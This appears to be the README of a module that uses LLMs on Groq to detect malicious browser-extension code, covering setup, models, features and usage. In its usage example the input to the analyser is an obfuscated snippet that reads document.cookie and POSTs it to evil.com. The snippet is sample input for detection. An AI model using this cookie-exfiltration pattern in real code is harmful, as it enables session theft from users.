# AI-Powered Threat Analysis

## Overview

This module provides AI-powered code analysis using **Groq's free API**, which offers fast, high-quality LLM inference at no cost.

## Groq Setup

### 1. Get Free API Key

Visit https://console.groq.com and sign up for a free account. No credit card required.

### 2. Create API Key

1. Go to API Keys section
2. Click "Create API Key"
3. Copy the key

### 3. Configure Environment

Add to `database/.env`:
```
GROQ_API_KEY=gsk_your_api_key_here
```

## Supported Models

Groq provides free access to:

- **llama-3.3-70b-versatile** (default): Best for complex analysis, 128k context
- **llama-3.1-8b-instant**: Faster responses, good for quick checks
- **mixtral-8x7b-32768**: Good for analyzing long code snippets

## Features

### 1. Semantic Code Analysis
- Understands code intent, not just patterns
- Detects obfuscated malicious code
- Identifies attack vectors

### 2. Behavioral Pattern Analysis
- Analyzes extension behavior over time
- Detects anomalies and sudden changes
- Identifies indicators of compromise

### 3. Threat Intelligence
- Pattern matching for known threats
- Malicious domain detection
- Permission analysis

### 4. Report Generation
- Human-readable security reports
- Actionable recommendations
- Executive summaries

## Usage

```python
from ai.analyzer import get_analyzer
from ai.threat_intelligence import ThreatIntelligence

# Initialize analyzer
analyzer = get_analyzer()

# Analyze code
result = analyzer.analyze_code("""
eval(atob('dmFyIHg9ZG9jdW1lbnQuY29va2ll'));
fetch('https://evil.com', {method: 'POST', body: x});
""")

print(result['threat_level'])  # "critical"
print(result['malicious_intent'])  # True
print(result['findings'])  # List of security issues

# Scan with threat intelligence
threats = ThreatIntelligence.scan_code(code_snippet)
print(threats['risk_score'])  # 0-100
```

## Rate Limits

Groq free tier provides:
- 30 requests per minute
- 14,400 requests per day

This is more than sufficient for real-time extension monitoring.

## Fallback Mode

If API key is not configured or quota is exceeded, the system automatically falls back to pattern-based analysis using threat intelligence signatures.

## Privacy

All code analysis happens via Groq's API. No code is stored by Groq beyond the request/response cycle. For maximum privacy, you can:

1. Use local ML models instead (see `/extension/ml/`)
2. Self-host an LLM (Ollama, LM Studio)
3. Modify `analyzer.py` to use local inference
